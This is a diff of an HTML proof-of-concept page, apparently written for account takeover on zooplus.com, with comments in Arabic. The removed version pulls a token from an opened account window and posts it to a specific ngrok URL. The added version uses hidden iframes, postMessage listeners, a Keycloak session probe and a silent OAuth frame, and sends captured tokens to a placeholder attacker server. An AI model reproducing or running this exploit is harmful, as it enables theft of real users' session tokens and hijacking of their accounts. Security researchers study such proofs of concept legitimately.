@@ -1,59 +1,82 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC Full Account Takeover</title>
+    <title>Zooplus Token Leak PoC</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px; }
-        button { padding: 20px; background: #0f0; color: #000; font-weight: bold; cursor: pointer; border: none; }
+        body { background: #1a1a1a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
+        .log-entry { border-bottom: 1px solid #333; padding: 5px; margin-bottom: 5px; }
+        .token-highlight { color: #ff00ff; font-weight: bold; word-break: break-all; }
+        iframe { display: none; }
     </style>
 </head>
 <body>
-    <h1>تحذير: سيتم اختبار أمن الحساب</h1>
-    <p>اضغط على الزر أدناه لبدء عملية فحص التوكن</p>
-    
-    <button onclick="startAttack()">ابدأ الفحص (Start Exploit)</button>
+    <h2>[!] Zooplus Identity Hijacking Terminal</h2>
+    <div id="status">Initializing Attack Vectors...</div>
+    <div id="console"></div>
 
-    <div id="status"></div>
+    <iframe id="bridge_iframe" src="https://stm.zooplus.com/sw_iframe.html?origin=https://YOUR-DOMAIN.com"></iframe>
+    
+    <iframe id="auth_iframe" src="https://login.zooplus.com/auth/realms/zooplus/protocol/openid-connect/login-status-iframe.html"></iframe>
 
     <script>
-        const NGROK = "https://subsphenoidal-dauntlessly-pura.ngrok-free.dev/token-leak";
+        const logBox = document.getElementById('console');
+        const statusBox = document.getElementById('status');
 
-        function startAttack() {
-            document.getElementById('status').innerText = "جاري فتح الهدف...";
-            
-            // 1. فتح صفحة الحساب في نافذة جديدة
-            const victimWin = window.open("https://www.zooplus.com/account/overview", "_blank");
-
-            // 2. الانتظار حتى يتم تحميل الصفحة ثم سحب التوكن
-            // بما أننا "فتحنا" النافذة، قد نتمكن من الوصول لبعض الخصائص إذا كان الـ COOP غير مفعل
-            const checker = setInterval(() => {
-                try {
-                    // محاولة الوصول للمتغير العالمي مباشرة من النافذة المفتوحة
-                    const token = victimWin.frontendAuthorizer.token;
-                    
-                    if (token) {
-                        clearInterval(checker);
-                        document.body.innerHTML = "<h1 style='color:red'>🔥 تم سحب التوكن بنجاح!</h1>";
-                        
-                        // إرسال التوكن فوراً لسيرفرك
-                        fetch(NGROK, {
-                            method: "POST",
-                            mode: "no-cors",
-                            body: JSON.stringify({
-                                msg: "SUCCESS_FULL_TOKEN_LEAK",
-                                jwt: token
-                            })
-                        });
-                        
-                        console.log("Token Captured:", token);
-                        victimWin.close(); // إغلاق الصفحة بعد السرقة
-                    }
-                } catch (e) {
-                    // إذا منعنا المتصفح (CORS)، سنستمر في المحاولة عبر الجسر
-                    console.log("Waiting for bypass...");
-                }
-            }, 2000);
+        function log(msg, isCritical = false) {
+            const div = document.createElement('div');
+            div.className = 'log-entry';
+            div.innerHTML = `<span style="color: ${isCritical ? 'red' : '#00ff00'}">[${new Date().toLocaleTimeString()}]</span> ${msg}`;
+            logBox.prepend(div);
         }
+
+        window.addEventListener("message", function(event) {
+            // رصد أي رسائل قادمة من نطاقات zooplus
+            if (event.origin.includes("zooplus.com")) {
+                log(`RECEIVED from ${event.origin}: ` + JSON.stringify(event.data));
+
+                // إذا كانت الرسالة تحتوي على التوكن أو معلومات الجلسة
+                if (event.data.token || event.data.access_token) {
+                    log(`🎯 SUCCESS! Access Token Leaked: <span class="token-highlight">${event.data.token || event.data.access_token}</span>`, true);
+                    statusBox.innerText = "TOKEN CAPTURED!";
+                    
+                    // تهريب التوكن فوراً لسيرفر المهاجم
+                    fetch(`https://YOUR-ATTACKER-SERVER.com/collect?token=${event.data.token}`);
+                }
+
+                // إذا حصلنا على الـ ClientID، نبدأ المرحلة الثانية
+                if (event.data.clientId) {
+                    log(`Found ClientID: ${event.data.clientId}. Attempting Session Hijacking...`);
+                    triggerKeycloakProbe(event.data.clientId);
+                }
+            }
+        });
+
+        function triggerKeycloakProbe(clientId) {
+            const authWin = document.getElementById('auth_iframe').contentWindow;
+            // محاولة إجبار Keycloak على كشف الحالة
+            authWin.postMessage(clientId + " check-session", "https://login.zooplus.com");
+        }
+
+        // محاولة سحب التوكن عبر الجسر بعد التحميل
+        document.getElementById('bridge_iframe').onload = function() {
+            log("Bridge loaded. Injecting Request for frontendAuthorizer...");
+            const bridgeWin = document.getElementById('bridge_iframe').contentWindow;
+            
+            // نرسل طلباً للجسر يحاكي طلبات الموقع الداخلي لسحب التوكن
+            bridgeWin.postMessage({
+                type: "GET_AUTHORIZATION",
+                property: "frontendAuthorizer.token" 
+            }, "*");
+        };
+
+        // محاكاة عملية Silent Refresh لسحب توكن جديد
+        setTimeout(() => {
+            log("Attempting Silent Authentication Flow via hidden frame...");
+            const silentFrame = document.createElement('iframe');
+            silentFrame.src = "https://login.zooplus.com/auth/realms/zooplus/protocol/openid-connect/auth?client_id=shop-myzooplus-prod-zooplus&response_type=token&scope=openid&prompt=none&redirect_uri=https://stm.zooplus.com/sw_iframe.html";
+            document.body.appendChild(silentFrame);
+        }, 5000);
+
     </script>
 </body>
 </html>
